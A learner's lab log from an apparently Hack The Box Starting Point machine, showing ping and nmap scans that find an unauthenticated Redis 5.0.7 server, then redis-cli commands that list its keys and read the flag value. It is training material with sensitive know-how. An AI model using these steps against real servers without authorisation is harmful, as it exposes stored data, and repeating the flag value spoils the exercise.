─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-wpdm4maded]─[~]
└──╼ [★]$ ping ^C^C
┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-wpdm4maded]─[~]
└──╼ [★]$ ping 10.129.136.187
PING 10.129.136.187 (10.129.136.187) 56(84) bytes of data.
64 bytes from 10.129.136.187: icmp_seq=1 ttl=63 time=74.9 ms
64 bytes from 10.129.136.187: icmp_seq=2 ttl=63 time=74.8 ms
64 bytes from 10.129.136.187: icmp_seq=3 ttl=63 time=73.5 ms
^C
--- 10.129.136.187 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 73.497/74.402/74.864/0.640 ms
┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-wpdm4maded]─[~]
└──╼ [★]$ nmap -sV 10.129.136.187
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-02 08:30 EDT
Nmap scan report for 10.129.136.187
Host is up (0.074s latency).
All 1000 scanned ports on 10.129.136.187 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-wpdm4maded]─[~]
└──╼ [★]$ nmap -p -sV 10.129.136.187
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-02 08:31 EDT
Error #486: Your port specifications are illegal.  Example of proper form: "-100,200-1024,T:3000-4000,U:60000-"
QUITTING!
┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-wpdm4maded]─[~]
└──╼ [★]$ nmap -p -sV 10.129.136.187
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-02 08:31 EDT
Error #486: Your port specifications are illegal.  Example of proper form: "-100,200-1024,T:3000-4000,U:60000-"
QUITTING!
┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-wpdm4maded]─[~]
└──╼ [★]$ nmap -p- -sV 10.129.136.187
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-02 08:32 EDT
Nmap scan report for 10.129.136.187
Host is up (0.074s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.68 seconds
┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-wpdm4maded]─[~]
└──╼ [★]$ man nmap
┌─[eu-starting-point-1-dhcp]─[10.10.15.90]─[senoshibe@htb-wpdm4maded]─[~]
└──╼ [★]$ 


nmap -sV [IP ADDRESS] scans the top 1000 ports according to man nmap

Whereas nmap -p- -sV [IP ADDRESS] scans all ports, hence why the former wasn't able to find the redis server, whereas the latter did.

#Notable Tools

1. 
```bash
sudo apt redis-tools
```
2.
```bash
redis-cli -h 10.129.136.187
```
3.
```bash
select 0 #select the database number; In this case db0
```
4.
```bash
keys * #list of all keys
```

5.
```bash
get [key_name] #retrieves hash of key 


# Keyspace
db0:keys=4,expires=0,avg_ttl=0
10.129.136.187:6379> selec 0
(error) ERR unknown command `selec`, with args beginning with: `0`, 
10.129.136.187:6379> select 0
OK
10.129.136.187:6379> keys *
1) "numb"
2) "temp"
3) "stor"
4) "flag"
10.129.136.187:6379> get numb
"bb2c8a7506ee45cc981eb88bb81dddab"
10.129.136.187:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
